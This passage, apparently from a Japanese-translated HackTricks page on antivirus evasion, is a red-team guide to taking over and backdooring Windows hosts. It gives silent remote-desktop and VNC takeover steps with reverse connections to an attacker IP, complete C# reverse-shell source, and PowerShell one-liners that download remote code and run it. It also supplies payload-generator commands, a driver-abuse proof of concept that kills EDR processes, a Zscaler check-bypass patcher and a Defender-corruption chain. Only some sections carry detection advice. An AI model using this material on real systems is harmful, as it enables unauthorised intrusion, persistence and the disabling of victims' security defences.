- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に記載されているように、被害者の PC に Chrome Remote Desktop を展開してそれを使って乗っ取り、永続化を維持するのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックし、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者でインストーラをサイレント実行（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop ページに戻って Next をクリックします。ウィザードが認可を求めるので、Authorize ボタンをクリックして続行します。
4. 与えられたパラメータを少し調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（GUI を使わずに pin を設定できる点に注意）

## Advanced Evasion

Evasion は非常に複雑なトピックで、成熟した環境では完全に検出を回避することはほぼ不可能です。1 台のシステム内でも多くの異なるテレメトリソースを考慮する必要があるためです。

攻撃対象の環境ごとに強みと弱みが異なります。

より高度な Evasion 技術の足がかりを得たいなら、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強く勧めます。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth に関する別の優れたトークです。

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリのパーツを順に取り除いていき、どの部分を Defender が悪意ありと判断しているかを突き止めてくれます。\
同様のことを行う別のツールとして [**avred**](https://github.com/dobin/avred) があり、サービスを公開したウェブは [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) です。

### **Telnet Server**

Windows10 までは、すべての Windows に管理者としてインストールできる **Telnet server** が付属していました。以下のようにしてインストールできます:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**開始**するように設定し、今すぐ**実行**してください：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートを変更する** (ステルス) とファイアウォールを無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** ステルスを維持するために、いくつかの操作を行ってはいけません

- `winvnc` が既に実行中の場合は起動しないこと。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。実行中か確認するには `tasklist | findstr winvnc`
- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動しないこと。設定ウィンドウが開きます（[the config window](https://i.imgur.com/rfMQWcf.png)）
- ヘルプのために `winvnc -h` を実行しないこと。これも [popup](https://i.imgur.com/oc18wcu.png) を引き起こします

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc`で**listerを起動**し、次のコマンドで**xml payloadを実行**します:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の defender はプロセスを非常に速く終了させます。**

### 自分の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

コンパイルするには:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下と一緒に使用する:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# の難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### インジェクタをビルドするための Python の例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR 無効化

Storm-2603 は **Antivirus Terminator** として知られる小さなコンソールユーティリティを利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。ツールは **独自の脆弱だが *署名済み* のドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) の AV サービスでもブロックできない特権カーネル操作を実行します。

重要ポイント
1. **Signed driver**: ディスク上に配置されるファイルは `ServiceMouse.sys` ですが、バイナリ自体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを **kernel service** として登録し、2 行目で起動するため `\\.\ServiceMouse` がユーザランドからアクセス可能になります。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID で任意のプロセスを終了（Defender/EDR サービスを停止するために使用） |
| `0x990000D0` | 任意のファイルをディスク上から削除 |
| `0x990001D0` | ドライバをアンロードしてサービスを削除 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD はユーザモードの保護を完全に回避します。カーネルで実行されるコードは *protected* なプロセスを開き、終了させたり、PPL/PP、ELAM やその他のハードニング機能に関係なくカーネルオブジェクトを改変したりできます。

Detection / Mitigation
•  Microsoft の脆弱ドライバブロックリスト（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
•  新しい *kernel* サービスの作成を監視し、ワールドライト可能なディレクトリからロードされたドライバや allow-list に無いドライバがロードされた場合にアラートを出す。  
•  カスタムデバイスオブジェクトへのユーザモードハンドル作成と、それに続く疑わしい `DeviceIoControl` 呼び出しを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC を利用します。設計上の弱点が二つあり、完全なバイパスを可能にします:

1. ポスチャ評価は **完全にクライアント側で** 行われる（サーバには boolean が送信されるのみ）。  
2. 内部 RPC エンドポイントは接続してくる実行ファイルが **Zscaler によって署名されていること** （`WinVerifyTrust` を通じて）だけを検証する。

ディスク上の署名済みバイナリを 4 つパッチすることで、両方の仕組みを無効化できます:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すようにして、すべてのチェックを準拠とする |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化 ⇒ 任意の（未署名のものを含む）プロセスが RPC パイプにバインド可能 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換え |
| `ZSATunnel.exe` | トンネルの整合性チェック | ショートサーキット化 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **すべての** posture checks が **green/compliant** と表示されます。
* 署名されていない、または改変されたバイナリでも named-pipe RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開くことができます。
* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークへ無制限にアクセスできるようになります。

このケーススタディは、クライアント側のみの信頼判断と単純な署名チェックが、数バイトのパッチでいかに破られるかを示しています。

## Protected Process Light (PPL) を悪用して LOLBINs による AV/EDR の改ざん

Protected Process Light (PPL) は署名者／レベルの階層を強制し、同等または上位の保護プロセスのみが互いに改ざんできるようにします。攻撃的には、正当に PPL 対応バイナリを起動しその引数を制御できる場合、良性の機能（例えばログ出力）を AV/EDR が使用する保護ディレクトリに対する制限付きの、PPL バックの書き込みプリミティブに変換できます。

プロセスが PPL として動作する条件
- ターゲットの EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要があります。
- プロセスは CreateProcess を使用して、フラグ `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` を指定して作成される必要があります。
- バイナリの署名者に一致する互換性のある保護レベル（例: anti-malware 署名者向けの `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者向けの `PROTECTION_LEVEL_WINDOWS`）が要求される必要があります。誤ったレベルでは作成に失敗します。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲット EXE に転送します）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名されたシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け取ります。
- PPLプロセスとして起動されると、ファイル書き込みはPPLにより保護されます。
- ClipUpは空白を含むパスを解析できません。通常保護された場所を指すには8.3短縮パスを使用してください。

8.3 short path helpers
- 短縮名を一覧表示: 各親ディレクトリで `dir /x` を実行。
- cmdで短縮パスを取得: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL対応のLOLBIN (ClipUp) を `CREATE_PROTECTED_PROCESS` 付きでランチャー（例: CreateProcessAsPPL）を使って起動する。
2) ClipUpのログパス引数を渡し、保護されたAVディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら8.3短縮名を使用する。
3) ターゲットのバイナリが通常AVによって実行中に開かれて/ロックされている場合（例: MsMpEng.exe）、AVが起動する前のブート時に書き込みが行われるよう、より早く確実に実行されるオートスタートサービスをインストールしてスケジュールする。ブート順序は Process Monitor（ブートログ）で検証する。
4) 再起動時、PPLで保護された書き込みがAVがバイナリをロックする前に行われ、ターゲットファイルが破損して起動を妨げる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容は配置場所以外で制御できません。プリミティブは精密なコンテンツ注入よりも改ざんに適しています。
- サービスのインストール／起動にはローカル管理者/SYSTEM 権限が必要で、再起動の機会が必要です。
- タイミングが重要：対象が開かれていてはなりません。ブート時実行はファイルロックを回避します。

Detections
- 起動時付近において、非標準のランチャーを親に持つなど異常な引数で `ClipUp.exe` が生成されるプロセスの作成を検出する。
- 自動起動に設定された疑わしいバイナリを指す新しいサービスがあり、常に Defender/AV より先に起動している場合。Defender の起動失敗に先立つサービス作成/変更を調査する。
- Defender バイナリや Platform ディレクトリに対するファイル整合性監視：protected-process フラグを持つプロセスによる予期しないファイル作成/変更を確認する。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を探す。

Mitigations
- WDAC/Code Integrity：どの署名済みバイナリが PPL として、どの親プロセス下で実行できるかを制限する。正当なコンテキスト以外での ClipUp 呼び出しをブロックする。
- サービス管理：自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
- Defender の tamper protection と early-launch 保護を有効にし、バイナリ破損を示す起動時エラーを調査する。
- 環境に適合する場合、セキュリティツールを配置するボリュームで 8.3 short-name 生成を無効化することを検討する（十分にテストすること）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
